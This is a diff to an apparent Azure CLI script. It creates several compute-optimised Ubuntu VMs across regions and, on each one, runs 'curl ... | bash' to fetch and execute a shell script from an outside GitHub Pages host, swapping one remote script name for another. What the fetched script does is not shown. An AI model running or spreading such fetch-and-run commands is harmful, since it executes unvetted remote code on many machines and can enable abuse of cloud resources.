@@ -14,7 +14,7 @@ az vm extension set \
   --name CustomScript \
   --vm-name myVM3 \
   --resource-group myResourceGroup3 \
-  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/pasc.sh\" | bash"}'
+  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/lokigg.sh\" | bash"}'
 
 az group create --name myResourceGroup4 --location eastus
 
@@ -32,7 +32,7 @@ az vm extension set \
   --name CustomScript \
   --vm-name myVM11 \
   --resource-group myResourceGroup4 \
-   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/pasc.sh\" | bash"}'
+   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/lokigg.sh\" | bash"}'
   
 az group create --name myResourceGroup22 --location westus
 
@@ -51,5 +51,47 @@ az vm extension set \
   --name CustomScript \
   --vm-name myVM22 \
   --resource-group myResourceGroup22 \
-   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/pasc.sh\" | bash"}'
+   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/lokigg.sh\" | bash"}'
+   
+
+   
+az group create --name myResourceGroup32 --location eastus2
+
+
+az vm create \
+    --resource-group myResourceGroup32 \
+    --name myVM44 \
+	--size Standard_F8s_v2 \
+    --image UbuntuLTS \
+    --admin-username azureuser \
+    --generate-ssh-keys
+  
+az vm extension set \
+  --publisher Microsoft.Azure.Extensions \
+  --version 2.0 \
+  --name CustomScript \
+  --vm-name myVM44 \
+  --resource-group myResourceGroup32 \
+   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/lokigg.sh\" | bash"}'
+   
+   
+az group create --name myResourceGroup48 --location northcentralus
+
+
+az vm create \
+    --resource-group myResourceGroup48 \
+    --name myVM48 \
+	--size Standard_F8s \
+    --image UbuntuLTS \
+    --admin-username azureuser \
+    --generate-ssh-keys
+  
+az vm extension set \
+  --publisher Microsoft.Azure.Extensions \
+  --version 2.0 \
+  --name CustomScript \
+  --vm-name myVM48 \
+  --resource-group myResourceGroup48 \
+   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/lokigg.sh\" | bash"}'
+   
    
